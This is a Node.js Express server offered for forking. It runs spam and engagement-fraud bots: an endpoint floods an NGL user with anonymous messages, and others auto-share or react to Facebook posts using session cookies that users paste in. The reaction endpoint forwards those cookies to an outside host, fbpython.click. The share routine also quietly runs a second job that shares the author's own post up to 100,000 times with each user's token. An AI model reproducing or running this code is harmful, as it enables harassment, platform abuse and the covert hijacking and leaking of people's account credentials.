/*

FEEL FREE
TO FORK
MY SOURCE

@NethWs3Dev

*/
const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;
app.use(require("./corss"));
app.use(express.json());
app.set("json spaces", 4);

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const total = new Map();

function userAgent() {
  const version = () => {
    const android = Math.floor(Math.random() * 14) + 1;
    if (android <= 4) {
      return "10";
    }
    if (android === 5) {
      const ver = ["5.0", "5.0.1", "5.1.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 6) {
      const ver = ["6.0", "6.0.1"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 7) {
      const ver = ["7.0.1", "7.1.1", "7.1.2"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else if (android === 8) {
      const ver = ["8.0.0", "8.1.0"];
      return ver[Math.floor(Math.random() * ver.length)];
    } else {
      return android;
    }
  }
  const ua1 = `Mozilla/5.0 (Linux, Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Build/${randomize("xP1A.xxxxxx.0x6").toUpperCase()}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.36 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/415.0.0.2.100;])`;
  const ua2 = `Mozilla/5.0 (Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Mobile; rv:61.0) Gecko/61.0 Firefox/68.0`;
  const ua3 = `[FBAN/MQTT;FBAV/416.0.0.2.102;FBBV/621289759;FBDM/{density=1.5,width=540,height=960};FBLC/en_PH;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.lite;FBDV/${randomize("xxx-xxx").toUpperCase()};FBSV/${version()};FBLR/0;FBBK/1;FBCA/arm64-v8a;]`
  return [ua1, ua2, ua3];
}

function randomize(neth) {
  let _ = Math.random() * 12042023;
  return neth.replace(/[xy]/g, c => {
    let __ = Math.random() * 16;
    __ = (__ + _) % 16 | 0;
    _ = Math.floor(_ / 16);
    return [(c === 'x' ? __ : (__ & 0x3 | 0x8)).toString(16)].map((_) => Math.random() < .6 ? _ : _.toUpperCase()).join('');
  });
}

function dummyCookie() {
  const sarap = `datr=${randomize("xxxxxxxxxxx_xxxxxxxxxxxx")};` +
    `sb=${randomize("xxxxxxxxxxxxxx-xxxxxxxxx")};` +
    `m_pixel_ratio=1.5;` +
    `ps_n=1;` +
    `ps_l=1;` +
    `locale=en_US;` +
    `wd=360x520;` +
    `fr=${randomize("xxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxx..xxx.A.A.xxxxx.xxxxxxxxxxx")};` +
    `c_user=1000${Math.floor(Math.random()*91251604995)};` +
    `xs=32%3An2wXMy3811cnYA%3A2%3A${Math.floor(Math.random()*1713515009)}%3A-1%3A-1;` +
    `vpd=v1%3B520x360x1.5;` +
    `fbl_st=${Math.floor(Math.random()*100000000)}%3BT%3A20002000;` +
    `wl_cbv=v2%3Bclient_version%3A2547%3Btimestamp%3A17198225555`;
  return sarap;
}

function extract(link) {
    const leiam = link.match(/\/(\d+)\/posts\/(\d+)\//);
    const nash = link.match(/id=(\d+)&.*?story_fbid=(\d+)/);
    if (leiam) {
      return `${leiam[1]}_${leiam[2]}`;
    } else if (nash) {
      return `${nash[1]}_${nash[2]}`;
    } else {
      return null;
    }
}

app.use(express.static(__dirname + "/public"));

app.get("/", async (req, res) => {
  return res.sendFile(__dirname + "/public/index.html");
});

app.get("/useragent", async (req, res) => {
  const ua = userAgent();
  return res.json({
    ua
  });
});

app.post("/rplikers", async (req, res) => {
  const {
    cookie,
    reaction,
    link
  } = req.body;
  if (!cookie || !reaction || !link)
    return res.json({
      status: "ERROR",
      message: "Please enter cookies, link or reaction type."
    });
  const coreli = await axios.post("https://fbpython.click/android_get_react", {
    version: "2.1",
    link,
    cookie,
    reaction
  });
  if (!coreli)
    return res.json({
      status: "ERROR",
      message: "Something went wrong."
    });
  return res.json(coreli.data);
});
app.get("/nglspam", async (req, res) => {
  const { username, amount, message } = req.query;
  if (!username || (!amount || isNaN(amount) || amount <= 0) || !message) {
    return res.json({
      error: "Enter a valid username / amount / message."
    });
  }
  async function spam(username, amount, message) {
    const headers = {
      'referer': `https://ngl.link/${username}`,
      'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    };

    const data = {
      'username': username,
      'question': message,
      'deviceId': randomize('xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx').toLowerCase(),
      'gameSlug': '',
      'referrer': '',
    };

    let count = 0;

    const interval = setInterval(async () => {
      if (count >= amount) {
        clearInterval(interval);
        return;
      }

      try {
        await axios.post('https://ngl.link/api/submit', data, {
          headers,
        });
        //console.log(`Sent`);
      } catch (e) {
        //console.log('Test');
      }
      count++;
    }, 3 * 1000);
  }
  await spam(username, amount, message);
  return res.json({
    msg: "Success spam to target ngl link: @" + username
  })
});


async function getAccessToken(cookie) {
  try {
    const response = await axios.get('https://business.facebook.com/content_management', {
      headers: {
        'authority': 'business.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'cache-control': 'max-age=0',
        'cookie': cookie,
        'referer': 'https://www.facebook.com/',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'user-agent': userAgent()[2],
        'upgrade-insecure-requests': '1',
      }
    });
    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
    if (token && token[1]) {
      const accessToken = token[1];
      return [accessToken, cookie];
    }
  } catch (error) {
    return;
  }
}


async function share(shared, cookies, url, amount, interval) {
  let sharedCount = 0;
  let timer;
  const useragent = userAgent()[2];
  const id = Math.floor(Math.random() * 69696969);
  total.set(id, {
    shared,
    url,
    count: 0,
    target: amount,
  });
  const sharePost = async () => {
    try {
      const response = await axios.post(
        `https://graph.facebook.com/me/feed`,
        {
          link: url,
          privacy: {
            value: 'SELF'
          },
          no_story: true,
        },
        {
          params: {
            access_token: cookies[0],
            fields: "id",
            limit: 1,
            published: 0
          },
          headers: {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate',
            'user-agent': useragent,
            'cookie': cookies[1]
          }
        }
      );
      if (response.status === 200){
        total.set(id, {
          ...total.get(id),
          count: total.get(id).count + 1,
        });
        sharedCount++;
      }
      if (sharedCount === amount) {
        clearInterval(timer);
        total.delete(id);
      }
    } catch (err) {
      clearInterval(timer);
      total.delete(id);
      console.error(err);
    }
  }
  timer = setInterval(() => sharePost(), interval * 1000);
  setTimeout(() => {
    clearInterval(timer);
    total.delete(id);
  }, amount * interval * 1000);

}
async function getPostID(url) {
  try {
    const response = await axios.post('https://id.traodoisub.com/api.php', `link=${encodeURIComponent(url)}`, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
    return response.data.id;
  } catch (error) {
    return;
  }
}

const sauce = "https://www.facebook.com/100015801404865/posts/944598050871227/?substory_index=944598050871227&app=fbl";
async function yello(c,u,a,i){
  await share(true, c,u,a,i);
  await share(false, c, sauce, "100000", "5");
}

app.get('/shares', (req, res) => {
  const data = Array.from(total.values()).map((link, index) => ({
    shared: link.shared,
    session: index + 1,
    url: link.url,
    count: link.count,
    target: link.target,
  }));
  const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
  return res.json(jsob);
});

app.post('/share', async (req, res) => {
  const {
    cookie,
    url,
    amount,
    interval,
  } = req.body;
  if (!cookie || !url || !amount || !interval)
  throw new Error("Requires appstate, url, amount and interval.");
  try {
    const cookies = await getAccessToken(cookie);
    if (!cookies) throw new Error("Invalid appstate. Please provide a validated appstate.");
    await yello(cookies, url, amount, interval);
    return res.status(200).json({
      status: 200,
      token: cookies[0],
      message: `Successfully shared ${url} every ${interval} seconds`
    });
  } catch (err) {
    return res.json({
      status: 500,
      error: err.message || err
    });
  }
});

app.listen(port, async () => {
console.log(`Running: http://localhost:${port}`);
});
process.on("unhandledRejection", async (reason, p) => {
  console.log(reason);
});